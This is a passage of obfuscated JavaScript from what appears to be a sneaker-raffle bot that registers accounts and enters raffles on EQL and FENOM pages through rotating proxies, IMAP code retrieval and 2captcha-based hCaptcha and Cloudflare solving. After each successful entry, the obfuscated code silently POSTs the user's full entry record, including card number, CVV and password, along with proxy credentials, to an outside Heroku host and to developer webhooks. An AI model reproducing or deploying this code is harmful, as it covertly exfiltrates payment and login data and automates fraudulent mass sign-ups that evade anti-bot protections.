                            await _0xfa5357(0x3e8), await _0xfa5357(0x1f4), await _0xd558a7['type']('#address1', _0x38dcb4[_0x235c8a]['Address1'] + '\x20' + _0x38dcb4[_0x235c8a]['HouseNumber']), await _0xfa5357(0x1f4), await _0xd558a7['type']('#address2', '' + _0x38dcb4[_0x235c8a]['Address2']), await _0xfa5357(0x1f4), await _0xd558a7['type']('#city', '' + _0x38dcb4[_0x235c8a]['City']), await _0xfa5357(0x1f4), await _0xd558a7['type']('#postcode', '' + _0x38dcb4[_0x235c8a]['Zip']), await _0xfa5357(0x3e8), await _0xd558a7['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xfa5357(0x3e8), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x412eb8 = await _0xd558a7['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x412eb8 && (await _0xd558a7['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xd558a7['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xd558a7['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfa5357(0x4b0), await _0xd558a7['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfa5357(0x1f4), await _0xd558a7['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CardNumber']), await _0xfa5357(0x320), await _0xd558a7['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xd558a7['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xd558a7['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['ExpiryDate']), await _0xfa5357(0x4b0), await _0xd558a7['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xd558a7['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xd558a7['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CVV']), await _0xfa5357(0x226), await _0xd558a7['type']('input[name=\x22postalCode\x22]', '' + _0x38dcb4[_0x235c8a]['Zip']), await _0xfa5357(0x226));
                            const _0xe38ed4 = await _0xd558a7['$']('.__PrivateStripeElement');
                            _0xe38ed4 && (await _0xfa5357(0x1f4), await _0xd558a7['click']('.__PrivateStripeElement'), await _0xd558a7['click']('.__PrivateStripeElement'), await _0xd558a7['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CardNumber']), await _0xd558a7['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['ExpiryDate']), await _0xd558a7['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CVV']));
                            await _0xfa5357(0x226), await _0xd558a7['click']('#paymentConsent'), await _0xfa5357(0x226), await _0xd558a7['click']('#termsConsent'), await _0xfa5357(0x2bc), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xd558a7['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xfa5357(0x2710);
                            try {
                                await _0xd558a7['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0xfa5357(0xbb8), await _0xd558a7['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5bdef0 => _0x5bdef0['click']()), await _0xd558a7['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x179c00 => _0x179c00['click']());
                            } catch {
                            }
                            try {
                                await _0xd558a7['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x485c59 = await _0xd558a7['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x485c59) {
                                    _0x13dabd['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x38dcb4[_0x235c8a]['Email'] + ',' + _0x38dcb4[_0x235c8a]['Password'] + ',' + _0x38dcb4[_0x235c8a]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0xea17d9() {
                                var _0x1abb9c, _0x5615ed = ![];
                                for (var _0x1983ea = 0x0; _0x1983ea < 0x18; _0x1983ea++) {
                                    async function _0x5bd842() {
                                        var _0x2fa623 = new _0x108c6b({
                                            'user': _0x50b722['masterMail'],
                                            'password': _0x50b722['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x13bbc8(_0x14105d) {
                                            _0x2fa623['openBox']('INBOX', ![], _0x14105d);
                                        }
                                        _0x2fa623['once']('ready', function () {
                                            console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x13bbc8(function (_0x34f343, _0x36b077) {
                                                console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x34f343)
                                                    throw _0x34f343;
                                                _0x2fa623['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x4379a0, _0x3e219f) {
                                                    if (!_0x3e219f || !_0x3e219f['length'])
                                                        console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2fa623['end']();
                                                    else {
                                                        var _0x4c59fe = _0x2fa623['seq']['fetch'](_0x3e219f, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4c59fe['on']('message', function (_0x20e8b2, _0x24bcdb) {
                                                            var _0x1270c8 = '(#' + _0x24bcdb + ')\x20';
                                                            _0x20e8b2['on']('body', function (_0x2ae4f1, _0x147934) {
                                                                _0x2e7895(_0x2ae4f1, (_0x3b9244, _0x2ddb62) => {
                                                                    if (_0x2ddb62['subject']['includes']('code')) {
                                                                        const _0x17859d = _0x2ddb62['text']['split']('\x0a\x0a')[0x3], _0x504349 = _0x17859d['split']('\x0a')[0x1];
                                                                        _0x1abb9c = _0x504349;
                                                                    }
                                                                });
                                                            }), _0x20e8b2['once']('end', function () {
                                                            });
                                                        }), _0x4c59fe['once']('error', function (_0x287c6a) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4c59fe['once']('end', function () {
                                                            _0x2fa623['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x2fa623['once']('error', function (_0xaac65a) {
                                            console['log'](_0x34d98c['red'](_0xaac65a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5615ed = !![];
                                        }), _0x2fa623['once']('end', async function () {
                                        }), _0x2fa623['connect']();
                                    }
                                    _0x5bd842(), await _0xfa5357(0x1388);
                                    if (_0x1abb9c)
                                        return _0x1abb9c;
                                    if (_0x5615ed)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1983ea == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xea17d9(), await _0xfa5357(0x1f4), await _0xd558a7['type']('#code', '' + code), await _0xfa5357(0x3e8), await _0xd558a7['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0xa6ee2d => _0xa6ee2d['click']()), await _0xd558a7['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0xd558a7['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x38dcb4[_0x235c8a]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x13dabd['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x38dcb4[_0x235c8a]['Email'] + ',' + _0x38dcb4[_0x235c8a]['Password'] + ',' + _0x38dcb4[_0x235c8a]['Phone']), _0x363c5b = 'no', _0x253d32(_0x38dcb4[_0x235c8a], _0x27d243);
                            var _0x424fc2 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'dev', ![]), _0x4f6642 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'pub', ![]);
                            let _0x53e219 = _0x38dcb4[_0x235c8a];
                            try {
                                prxdata = {
                                    'username': _0x4ee077['replace']('#', ''),
                                    'module': _0x27d243['name'],
                                    'entrydata': JSON['stringify'](_0x53e219),
                                    'proxy': '' + _0x519505[_0x235c8a]
                                };
                                var _0x5b9d0b = JSON['stringify'](prxdata);
                                let _0x16d014 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x5b9d0b, _0x16d014);
                            } catch (_0x1463c8) {
                            }
                            const _0x5acc2c = {
                                'succesDEVMSG': { 'embeds': [_0x424fc2] },
                                'succesPUBMSG': { 'embeds': [_0x4f6642] }
                            };
                            try {
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x5acc2c['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x5acc2c['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0x471d14, _0x5acc2c['succesPUBMSG']);
                            } catch (_0x7754c3) {
                                console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x7754c3));
                            }
                        } catch (_0x47cc99) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20' + _0x47cc99)), _0x42bc8c = '' + _0x47cc99;
                            var _0x56327f = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'dev', !![], _0x42bc8c), _0x424fc2 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'dev', ![]), _0x4f6642 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'pub', ![]);
                            const _0x1cc1c7 = {
                                'succesDEVMSG': { 'embeds': [_0x424fc2] },
                                'succesPUBMSG': { 'embeds': [_0x4f6642] }
                            };
                            _0x1cc1c7['errorDEV'] = { 'embeds': [_0x56327f] };
                            _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x1cc1c7['errorDEV']);
                            await _0x33437b(_0x5e1645, _0x1cc1c7['errorDEV']);
                            if (!_0x363c5b == 'no')
                                _0x363c5b = 'yes';
                        } finally {
                            _0x39e7d3 && _0x39e7d3['close']();
                            if (_0x363c5b == 'yes' && _0x31d40d != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Retrying\x20(' + _0x31d40d + '\x20/\x205)')), _0x235c8a = _0x235c8a - 0x1, _0x31d40d = _0x31d40d + 0x1;
                                continue;
                            }
                            _0x363c5b == 'yes' && _0x31d40d >= 0x5 && (_0x3003c7(_0x38dcb4[_0x235c8a], _0x27d243), _0x363c5b = 'no', _0x31d40d = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    } else {
                        const _0x9a1f11 = '' + _0x38dcb4[_0x235c8a]['Url'];
                        if (_0x363c5b != 'yes')
                            var _0x363c5b = '', _0x31d40d = 0x0;
                        if (_0x38dcb4[_0x235c8a]['Email'] == '' || _0x38dcb4[_0x235c8a]['FirstName'] == '' || _0x38dcb4[_0x235c8a]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x38dcb4[_0x235c8a]['Password'] == '' && (_0x38dcb4[_0x235c8a]['Password'] = 'JRaffles23!');
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x98e442 = _0x519505[_0x235c8a]['split'](':');
                        else
                            var _0x2d95cd = Math['round'](Math['random']() * (_0x519505['length'] - 0x1)), _0x98e442 = _0x519505[_0x2d95cd]['split'](':');
                        var _0x39e7d3;
                        try {
                            _0x39e7d3 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x98e442[0x0] + ':' + _0x98e442[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x39e7d3 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x98e442[0x0] + ':' + _0x98e442[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2f2d72 = await _0x39e7d3['newPage']();
                            await _0x2f2d72['authenticate']({
                                'username': '' + _0x98e442[0x2],
                                'password': '' + _0x98e442[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2f2d72['setRequestInterception'](!![]), _0x2f2d72['on']('request', _0x438ea7 => {
                                _0x438ea7['resourceType']() === 'image' || _0x438ea7['resourceType']() === 'font' || _0x438ea7['resourceType']() === 'media' ? _0x438ea7['abort']() : _0x438ea7['continue']();
                            }), await _0x2f2d72['goto'](_0x9a1f11), await _0x2f2d72['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2f2d72['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xfa5357(0x7d0), await _0x2f2d72['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2f2d72['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xfa5357(0x3e8), await _0x2f2d72['waitForSelector']('#email'), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2f2d72['type']('#email', '' + _0x38dcb4[_0x235c8a]['Email']), await _0xfa5357(0x352), await _0x2f2d72['waitForSelector']('#password'), await _0x2f2d72['type']('#password', '' + _0x38dcb4[_0x235c8a]['Password']), await _0xfa5357(0x352), await _0x2f2d72['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xfa5357(0x1388);
                            if (!_0x38dcb4[_0x235c8a]['Url']['includes']('footlocker'))
                                await _0x2f2d72['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x2f2d72['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x253d32(_0x38dcb4[_0x235c8a], _0x27d243), _0x363c5b = 'no';
                                continue;
                            }
                            await _0x2f2d72['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xfa5357(0x3e8), await _0x2f2d72['click']('li[data-value=\x22EU\x20' + _0x38dcb4[_0x235c8a]['Size'] + '\x22]'), await _0xfa5357(0x1f4);
                            const _0x525711 = await _0x2f2d72['$']('#title\x20>\x20label');
                            await _0xfa5357(0x12c);
                            _0x525711 && await _0x525711['click']();
                            await _0x2f2d72['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2f2d72['focus']('#postcode'), await _0x2f2d72['keyboard']['down']('Control'), await _0x2f2d72['keyboard']['press']('A'), await _0x2f2d72['keyboard']['up']('Control'), await _0x2f2d72['keyboard']['press']('Backspace'), await _0x2f2d72['keyboard']['type'](_0x38dcb4[_0x235c8a]['Zip']), await _0xfa5357(0x60e), await _0x2f2d72['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xfa5357(0x3e8), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xfa5357(0x1f4);
                            const _0x9cb2b2 = await _0x2f2d72['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x9cb2b2 && (await _0x2f2d72['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2f2d72['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2f2d72['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfa5357(0x4b0), await _0x2f2d72['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfa5357(0x1f4), await _0x2f2d72['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CardNumber']), await _0xfa5357(0x320), await _0x2f2d72['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2f2d72['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['ExpiryDate']), await _0xfa5357(0x4b0), await _0x2f2d72['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2f2d72['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CVV']), await _0xfa5357(0x226), await _0x2f2d72['type']('input[name=\x22postalCode\x22]', '' + _0x38dcb4[_0x235c8a]['Zip']), await _0xfa5357(0x226));
                            const _0x1c9d96 = await _0x2f2d72['$']('.__PrivateStripeElement');
                            _0x1c9d96 && (await _0x2f2d72['click']('#billingName'), await _0x2f2d72['click']('#billingName'), await _0x2f2d72['type']('#billingName', '' + _0x38dcb4[_0x235c8a]['NameOnCard']), await _0xfa5357(0x1f4), await _0x2f2d72['click']('.__PrivateStripeElement'), await _0x2f2d72['click']('.__PrivateStripeElement'), await _0x2f2d72['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CardNumber']), await _0x2f2d72['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['ExpiryDate']), await _0x2f2d72['keyboard']['type']('' + _0x38dcb4[_0x235c8a]['CVV']));
                            await _0xfa5357(0x226), await _0x2f2d72['click']('#paymentConsent'), await _0xfa5357(0x226), await _0x2f2d72['click']('#termsConsent'), await _0xfa5357(0x2bc), console['log'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2f2d72['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xfa5357(0x2710);
                            try {
                                await _0x2f2d72['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0xfa5357(0xbb8), await _0x2f2d72['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x189bac => _0x189bac['click']()), await _0x2f2d72['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x19c255 => _0x19c255['click']());
                            } catch {
                            }
                            try {
                                await _0x2f2d72['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x253d32(_0x38dcb4[_0x235c8a], _0x27d243);
                            var _0x424fc2 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'dev', ![]), _0x4f6642 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'pub', ![]);
                            let _0x4ab231 = _0x38dcb4[_0x235c8a];
                            try {
                                prxdata = {
                                    'username': _0x4ee077['replace']('#', ''),
                                    'module': _0x27d243['name'],
                                    'entrydata': JSON['stringify'](_0x4ab231),
                                    'proxy': '' + _0x519505[_0x235c8a]
                                };
                                var _0x5b9d0b = JSON['stringify'](prxdata);
                                let _0x4e1df9 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1a729a['post']('https://jraffles.herokuapp.com/success', _0x5b9d0b, _0x4e1df9);
                            } catch (_0x5be1fd) {
                            }
                            const _0x3f4e7f = {
                                'succesDEVMSG': { 'embeds': [_0x424fc2] },
                                'succesPUBMSG': { 'embeds': [_0x4f6642] }
                            };
                            try {
                                _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x3f4e7f['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x3f4e7f['succesDEVMSG']), await _0xfa5357(0xc8), await _0x33437b(_0x471d14, _0x3f4e7f['succesPUBMSG']);
                            } catch (_0x1944d0) {
                                console['log'](_0x34d98c['yellow'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1944d0));
                            }
                            _0x363c5b = 'no';
                        } catch (_0x3e0c70) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20' + _0x3e0c70)), _0x42bc8c = '' + _0x3e0c70;
                            var _0x56327f = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'dev', !![], _0x42bc8c), _0x424fc2 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'dev', ![]), _0x4f6642 = await _0xc964cf(_0x38dcb4[_0x235c8a], _0x27d243, 'pub', ![]);
                            const _0x7d2b90 = {
                                'succesDEVMSG': { 'embeds': [_0x424fc2] },
                                'succesPUBMSG': { 'embeds': [_0x4f6642] }
                            };
                            _0x7d2b90['errorDEV'] = { 'embeds': [_0x56327f] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x7d2b90['errorDEV']), await _0x33437b(_0x5e1645, _0x7d2b90['errorDEV']), _0x363c5b = 'yes';
                        } finally {
                            _0x39e7d3 && _0x39e7d3['close']();
                            if (_0x363c5b == 'yes' && _0x31d40d != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x27d243['name'] + ']\x20Task\x20' + (_0x235c8a + 0x1) + '\x20:\x20Retrying\x20(' + _0x31d40d + '\x20/\x205)')), _0x235c8a = _0x235c8a - 0x1, _0x31d40d = _0x31d40d + 0x1;
                                continue;
                            }
                            _0x363c5b == 'yes' && _0x31d40d >= 0x5 && (_0x3003c7(_0x38dcb4[_0x235c8a], _0x27d243), _0x363c5b = 'no', _0x31d40d = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x24e049, _0x1b5a79, _0x457fdb) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3f975a = 0x0; _0x3f975a < _0x1b5a79['length']; _0x3f975a++) {
                        if (_0x16ec42 != 'yes')
                            var _0x16ec42 = '', _0x346f35 = 0x0;
                        var _0x1189f5;
                        try {
                            await _0x559c6d(_0x1b5a79, _0x3f975a);
                        } catch {
                            _0x16ec42 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3b7620(_0x24e049['name'] + '\x20Task\x20' + (_0x3f975a + 0x1) + '\x20/\x20' + _0x1b5a79['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        var _0x4c0392 = await _0xc964cf(_0x1b5a79[_0x3f975a], _0x24e049, 'acc', ![]);
                        const _0x551c4a = { 'succesDEVMSG': { 'embeds': [_0x4c0392] } }, _0x53c50f = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x55f343 = Math['round'](Math['random']() * (_0x457fdb['length'] - 0x1)), _0x153d47 = _0x457fdb[_0x55f343]['split'](':'), _0x298197;
                        try {
                            _0x298197 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x153d47[0x0] + ':' + _0x153d47[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x298197 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x153d47[0x0] + ':' + _0x153d47[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x516101 = await _0x298197['newPage']();
                            await _0x516101['setViewport']({
                                'width': 0x500 + _0xe7ad75(0x1, 0x32),
                                'height': 0x2d9 + _0xe7ad75(0x1, 0x32)
                            });
                            const _0x211c63 = await _0x516101['target']()['createCDPSession'](), { windowId: _0x36d03c } = await _0x211c63['send']('Browser.getWindowForTarget');
                            await _0x516101['authenticate']({
                                'username': '' + _0x153d47[0x2],
                                'password': '' + _0x153d47[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x516101['goto']('' + _0x53c50f, { 'waitUntil': 'networkidle2' }), console['log'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xfa5357(0x1388);
                            var _0x27d225 = await _0x516101['$']('.hcaptcha-box');
                            if (_0x27d225) {
                                console['log'](_0x391006() + '\x20[' + _0x24e049['name'] + ']\x20Task\x20' + (_0x3f975a + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xfa5357(0x2710);
                                const _0x3281c2 = await _0x516101['$']('.hcaptcha-box');
                                if (_0x3281c2)
                                    try {
                                        await _0x3281c2['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x516101['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x34f8ba = await _0x516101['$']('.hcaptcha-box');
                                    if (_0x34f8ba)
                                        try {
                                            await _0x34f8ba['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x516101['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x211c63['send']('Browser.setWindowBounds', {
